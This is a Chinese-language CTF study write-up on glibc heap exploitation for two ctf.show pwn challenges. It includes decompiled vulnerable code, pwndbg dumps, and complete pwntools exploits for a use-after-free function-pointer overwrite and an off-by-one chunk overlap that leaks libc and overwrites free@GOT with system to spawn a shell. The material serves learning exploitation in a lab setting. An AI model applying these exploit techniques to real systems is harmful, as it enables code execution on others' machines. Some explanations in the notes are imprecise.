- 0
    - 线程属性，一般等价于 NULL
    - 表示使用默认线程属性
- threadFunc
    - 新线程启动后要执行的函数
- 0
    - 传给 threadFunc 的参数，一般等价于 NULL
让程序不是只跑主线程
而是额外开一个子线程去执行 threadFunc

### `pthread_join(newthread, &thread_return)` 的意思是：

- 主线程等待 newthread 这个子线程执行结束
- 子线程结束后，把它的返回值写到 thread_return 指向的位置
参数分别是：
- newthread
    - 你要等待的那个线程
- &thread_return
    - 用来接收子线程函数返回值的位置
    - 如果不关心返回值，也可以传 NULL
这道题目里面显示申请了一个堆，然后开另外一个线程生成了另外一个堆
第一个堆的地址是0x555555603310
```
pwndbg> x/4gx 0x555555603310-0x10
0x555555603300: 0x0000000000000000      0x00000000000003f1
0x555555603310: 0x0000000000000000      0x0000000000000000
```
之后打开一个新的线程
```
pwndbg> info thread
  Id   Target Id                               Frame 
* 1    Thread 0x7ffff7da2740 (LWP 73764) "pwn" 0x0000555555400be9 in main ()
  2    Thread 0x7ffff7da16c0 (LWP 76003) "pwn" __syscall_cancel_arch () at ../sysdeps/unix/sysv/linux/x86_64/syscall_cancel.S:56
```
然后再申请一个新的堆
```
pwndbg> heap
Allocated chunk | PREV_INUSE | NON_MAIN_ARENA
Addr: 0x7ffff00008d0
Size: 0x300 (with flag bits: 0x305)

Allocated chunk | PREV_INUSE | NON_MAIN_ARENA
Addr: 0x7ffff0000bd0
Size: 0x3f0 (with flag bits: 0x3f5)

Top chunk | PREV_INUSE
Addr: 0x7ffff0000fc0
Size: 0x20040 (with flag bits: 0x20041)

pwndbg> x/4gx 0x7ffff0000be0-0x10
0x7ffff0000bd0: 0x0000000000000000      0x00000000000003f5
0x7ffff0000be0: 0x0000000000000000      0x0000000000000000
```
从这里面能看出来第二个堆的地址
同时切换到线程1，再次查看堆的地址
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x300 (with flag bits: 0x301)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555603300
Size: 0x3f0 (with flag bits: 0x3f1)
fd: 0x555555603

Allocated chunk | PREV_INUSE
Addr: 0x5555556036f0
Size: 0x120 (with flag bits: 0x121)

Top chunk | PREV_INUSE
Addr: 0x555555603810
Size: 0x207f0 (with flag bits: 0x207f1)
```
能明显看出来，完全没有复用主程序的地址
说明线程相当于把程序直接当成了两个程序去执行，完全没有共同点，也不能覆盖
![[Pasted image 20260527232931.png]]
## 141
功能有三个，print，add和delete
```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_DWORD *)&notelist + v1) )
    (**((void (__cdecl ***)(_DWORD))&notelist + v1))(*((_DWORD *)&notelist + v1));
  return __readgsdword(0x14u) ^ v3;
}
```
这个的功能是输入第几个块，然后输出对应块里面的数据
```c
unsigned int add_note()
{
  int v0; // esi
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*((_DWORD *)&notelist + i) )//如果count+i的位置里面是空的
      {
        *((_DWORD *)&notelist + i) = malloc(8u);//给count+1开一个空间为8的堆
        if ( !*((_DWORD *)&notelist + i) )//如果这个空间没有堆，程序错误
        {
          puts("Alloca Error");
          exit(-1);
        }
        **((_DWORD **)&notelist + i) = print_note_content;//将print写入这个堆
        printf("Note size :");
        read(0, buf, 8u);//询问空间大小
        size = atoi(buf);//规格化大小
        v0 = *((_DWORD *)&notelist + i);//v0定义为堆的空间
        *(_DWORD *)(v0 + 4) = malloc(size);//v0+4定义为堆的地址
        if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )//如果刚刚定义的堆没有报错
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);//直接把数据写进堆
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full!");
  }
  return __readgsdword(0x14u) ^ v5;
}
```


```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_DWORD *)&notelist + v1) )
  {
    free(*(void **)(*((_DWORD *)&notelist + v1) + 4));
    free(*((void **)&notelist + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```
先给出exp，之后一步步解释
```python
from pwn import * 
count=1
gdb_flag=0
if count==0:
    io=process('./p')
else:
    io=remote('pwn.challenge.ctf.show',28132)
if gdb_flag==1:
    gdb.attach(io)
#从这里开始是题目的交互部分，cmd表示选择add，delete还是print
def cmd(x):
    io.recvuntil(b'choice :')
    io.sendline(str(x))
#下面三个是具体交互内容
def add(size,data):
    cmd(1)
    io.recvuntil(b'Note size :')
    io.sendline(str(size))
    io.recvuntil(b'Content :')
    io.sendline(data)
def delete(index):
    cmd(2)
    io.recvuntil(b'Index :')
    io.sendline(str(index))
def show(index):
    cmd(3)
    io.recvuntil(b'Index :')
    io.sendline(str(index))   
add(0x20,b'aaaa')
add(0x20,b'bbbb')
delete(0)
delete(1)
add(0x8,p32(0x8049684))
pause()
show(0)
io.interactive()
```
### add(0x20,b'aaaa')
添加一个堆，空间是0x20，然后赋值为aaaa
检查一下现在的堆，看一下里面有什么
```
pwndbg> x/12gx 0x804d1d8
0x804d1d8:      0x0000001100000000      0x0804d1f0080492d6
0x804d1e8:      0x0000003100000000      0x0000000a61616161
0x804d1f8:      0x0000000000000000      0x0000000000000000
0x804d208:      0x0000000000000000      0x0000000000000000
```
这个是我新建的堆，因为这个程序是32位的，所以展示出来就是这个模样
前面有一个新建的堆，这个是add自己建的堆，功能是存储一个函数，至于干什么你过会就知道了
### add(0x20,b'bbbb')
和上面一个差不多
```
pwndbg> x/12gx 0x804d1d8
0x804d1d8:      0x0000001100000000      0x0804d1f0080492d6
0x804d1e8:      0x0000003100000000      0x0000000a61616161
0x804d1f8:      0x0000000000000000      0x0000000000000000
0x804d208:      0x0000000000000000      0x0000000000000000
0x804d218:      0x0000001100000000      0x0804d230080492d6
0x804d228:      0x0000003100000000      0x0000000a61616161
```
### delete(0)
删除第一个堆
现在堆变成了这样
```
Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d1d8
Size: 0x10 (with flag bits: 0x11)
fd: 0x804d

Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d1e8
Size: 0x30 (with flag bits: 0x31)
fd: 0x804d

Allocated chunk | PREV_INUSE
Addr: 0x804d218
Size: 0x10 (with flag bits: 0x11)

Allocated chunk | PREV_INUSE
Addr: 0x804d228
Size: 0x30 (with flag bits: 0x31)
```
但是因为他删除用的函数是free，所以里面的东西根本就没有动，还在
### delete(1)
删除第二个堆
```
Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d1d8
Size: 0x10 (with flag bits: 0x11)
fd: 0x804d

Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d1e8
Size: 0x30 (with flag bits: 0x31)
fd: 0x804d

Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d218
Size: 0x10 (with flag bits: 0x11)
fd: 0x8045195

Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d228
Size: 0x30 (with flag bits: 0x31)
fd: 0x80451a5
```
现在四个堆全部被删除了，但是啥用也没有
因为新生成的堆还是这个模样
### add(0x8,p32(0x8049684))
之后插入第三个堆
```
Allocated chunk | PREV_INUSE
Addr: 0x804d1d8
Size: 0x10 (with flag bits: 0x11)

Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d1e8
Size: 0x30 (with flag bits: 0x31)
fd: 0x804d

Allocated chunk | PREV_INUSE
Addr: 0x804d218
Size: 0x10 (with flag bits: 0x11)

Free chunk (fastbins) | PREV_INUSE
Addr: 0x804d228
Size: 0x30 (with flag bits: 0x31)
fd: 0x80451a5
```
好像写到了1的原来的定义函数的堆上面去了
因为大小是一样的，所以优先分配到1的原来的堆的地址
之后直接执行0的函数就行了，因为这里面原来的位置已经被覆盖了
正常情况下gdb里面直接执行会报错，因为执行了我自己写入的东西
```
pwndbg> x/2gx 0x804d218
0x804d218:      0x0000001100000000      0x0804d1e0080492d6
pwndbg> x/2gx 0x804d1d8
0x804d1d8:      0x0000001100000000      0x0804d1f000000a61
```
所以这个程序直接崩溃了
最后就可以show(0)了
可以按释放顺序看：

1. add(0) 分到 note0
2. add(1) 分到 note1
3. delete(0)，note0 先进入 fastbin
4. delete(1)，note1 后进入 fastbin

fastbin 是单链表，后进先出。  （就是栈结构）
所以这时同尺寸 chunk 的取回顺序通常是：

1. 先取到 note1
2. 再取到 note0

但这题里 delete(1) 时还会先 free(content1) 再 free(note1)，而 delete(0) 也是一样。实际复用要看后续申请的 size 命中的是哪类 chunk。

更关键的是：  
最后那次 add(0x8, ...) 申请的是“content 大小为 8”的 note。程序内部会：

1. malloc(8) 给新的 note 结构体
2. 再 malloc(8) 给它的 content

所以它会消耗两个不同大小的空闲块。真正被输入覆盖的，是第二次 malloc 拿到的那块。
## 142
```c
unsigned __int64 create_heap()
{
  __int64 v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*((_QWORD *)&heaparray + i) )
    {
      *((_QWORD *)&heaparray + i) = malloc(0x10u);
      printf("Size of Heap : ");
      read(0, buf, 8u);
      size = atoi(buf);
      v0 = *((_QWORD *)&heaparray + i);
      *(_QWORD *)(v0 + 8) = malloc(size);
      **((_QWORD **)&heaparray + i) = size;
      printf("Content of heap:");
      read_input(*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```
`*((_QWORD *)&heaparray + i)`保存堆（note0）的地址
v0保存堆（note）的地址
堆（note0）+8里面保存了堆（node1）的地址
堆（node0）里面保存了堆的大小
堆（node1）内容自定义
```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( *((_QWORD *)&heaparray + v1) )
  {
    free(*(void **)(*((_QWORD *)&heaparray + v1) + 8LL));
    free(*((void **)&heaparray + v1));
    *((_QWORD *)&heaparray + v1) = 0;
    puts("Done !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
通过堆(node0)free堆(node1)
直接free堆(node0)
heaparray上面的地址被清空，无法指向node0
node1地址在没有清空的node0里面
存在uaf漏洞
```c
unsigned __int64 show_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf(
      "Size : %ld\nContent : %s\n",
      **((_QWORD **)&heaparray + v1),
      *(const char **)(*((_QWORD *)&heaparray + v1) + 8LL));
    puts("Done !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
展示，将输入的地址视为指针，输出这个地址指向的字符串
相当于我可以任意地址读取
```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf("Content of heap : ");
    read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);
    puts("Done !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
`**((_QWORD **)&heaparray + v1) + 1LL)`这个参数的size是错的，多了1
存在堆溢出漏洞，可以直接更改相邻的下一个堆的长度
现在整理一下可以攻击的条件：  
- 1.edit函数存在off-by-one，可以改物理上下一个chunck的size部分  
- 2.chunck1中存在chunck2的指针，改写成got表可以泄露libc，也可以改写got表内容，完成劫持
那么我们的攻击思路就出现了：  
- 1.off-by-one攻击造成堆块复用，获得对chunck1的改写权  
- 2.把chunck1中chunck2的指针改成got表泄露libc  
- 3.劫持free函数的got表为system，主动触发free

观察`read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);`
这句话中写到了可以对堆(node0)指向的字符串写
node0指定的是node1，但是可以通过uaf更改node0然后形成任意写
只要更改got表，就把覆盖got表格执行覆盖
先给出exp，然后一步步分析
```python
from pwn import *
context.binary = elf = ELF('./pwn', checksec=False)
context.log_level = 'debug'
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
def start():
    return process('./pwn')
def create(io, size, data):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap:', data)
def edit(io, idx, data):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(idx).encode())
    io.sendafter(b'Content of heap : ', data)
def show(io, idx):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(idx).encode())
def delete(io, idx):
    io.sendlineafter(b'Your choice :', b'4')
    io.sendlineafter(b'Index :', str(idx).encode())
def main():
    io = start()
    # phase 1: leak puts from libc
    create(io, 0x18, b'A' * 0x18)  # idx0
    create(io, 0x10, b'B' * 0x10)  # idx1
    edit(io, 0, b'A' * 0x18 + b'\x41')
    delete(io, 1)
    create(io, 0x30, b'C' * 0x20 + p64(8) + p64(elf.got['puts']))  # idx1
    show(io, 1)
    io.recvuntil(b'Content : ')
    puts_leak = u64(io.recvuntil(b'\nDone !', drop=True).ljust(8, b'\x00'))
    libc.address = puts_leak - libc.symbols['puts']
    log.success(f'puts leak = {hex(puts_leak)}')
    log.success(f'libc base = {hex(libc.address)}')
    log.success(f"system = {hex(libc.symbols['system'])}")
    # phase 2: overwrite free@got with system
    create(io, 0x18, b'E' * 0x18)  # idx2
    create(io, 0x10, b'F' * 0x10)  # idx3
    edit(io, 2, b'E' * 0x18 + b'\x41')
    delete(io, 3)
    create(io, 0x30, b'G' * 0x20 + p64(8) + p64(elf.got['free']))  # idx3
    edit(io, 3, p64(libc.symbols['system']))
    # phase 3: trigger system('/bin/sh')
    create(io, 0x10, b'/bin/sh\x00')  # idx4
    delete(io, 4)
    io.interactive()
if __name__ == '__main__':
    main()
```
现在我命名create的两个堆为node和heap
![[Pasted image 20260615153024.png]]
在第一次的create完成以后更改变量，node1的大小变化了
之后重新申请一下
因为释放了，bin里面有一个0x20的，一个0x40的
因为申请了一个0x10的node2，0x30的heap2
重新申请以后发现加上size恰好是这两个堆
所以重新申请到了原位置
![[Pasted image 20260615153511.png]]
这样子的情况下两个堆重合到了一起，
node2的size不能溢出到不能使用字段，不能瞎写这个道题目里面的ptr，除此以外别太大太小就行
然后在node里面直接输出指向的值
但是我的输出自定义了got里面puts的位置，所以能直接输出puts的值
通过这个直接进行libc偏移


